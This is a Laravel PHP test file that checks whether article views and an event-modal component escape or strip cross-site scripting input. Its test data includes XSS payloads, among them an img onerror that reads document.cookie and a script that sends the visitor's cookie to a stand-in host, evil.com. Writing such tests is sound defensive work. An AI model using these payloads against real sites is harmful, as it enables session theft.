<?php

namespace Tests\Feature;

use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Notification;
use Spatie\Permission\Models\Role;
use Tests\TestCase;

class XSSProtectionTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->withoutVite();
        Mail::fake();
        Notification::fake();
    }

    // -------------------------------------------------------------------------
    // Article content: <script> must be HTML-escaped in view-article.blade.php
    // -------------------------------------------------------------------------

    public function test_script_tags_are_escaped_in_article_view(): void
    {
        $post = \App\Models\Post::factory()->create([
            'content' => '<script>alert("xss")</script>Some content',
            'status'  => 'published',
        ]);

        $response = $this->get("/article/{$post->slug}");

        $response->assertStatus(200);
        // Raw <script> tag must NOT appear in the rendered HTML
        $response->assertDontSee('<script>alert("xss")</script>', escape: false);
        // The escaped version should appear instead
        $response->assertSee('&lt;script&gt;', escape: false);
    }

    public function test_img_onerror_is_escaped_in_article_view(): void
    {
        $post = \App\Models\Post::factory()->create([
            'content' => '<img src=x onerror="alert(document.cookie)">',
            'status'  => 'published',
        ]);

        $response = $this->get("/article/{$post->slug}");

        $response->assertStatus(200);
        $response->assertDontSee('onerror="alert(', escape: false);
    }

    // -------------------------------------------------------------------------
    // Event description: <script> must be stripped by strip_tags in widgets
    // -------------------------------------------------------------------------

    public function test_script_tags_stripped_from_event_description_in_modal(): void
    {
        $xssPayload = '<script>document.location="https://evil.com?c="+document.cookie</script><b>Legit text</b>';

        $role  = Role::create(['name' => 'admin', 'guard_name' => 'web']);
        $user  = User::factory()->create();
        $user->assignRole($role);

        // Render the event-modal component directly with the malicious description
        $rendered = view('custom.event-modal', [
            'record' => (object) [
                'description'  => $xssPayload,
                'title'        => 'Test Event',
                'start_date'   => now(),
                'end_date'     => now()->addHours(2),
                'getMedia'     => fn() => new class { public function first() { return null; } },
            ],
        ])->render();

        // The script tag must be absent
        $this->assertStringNotContainsString('<script>', $rendered);
        $this->assertStringNotContainsString('document.location', $rendered);
        // Safe tags should survive
        $this->assertStringContainsString('<b>Legit text</b>', $rendered);
    }
}
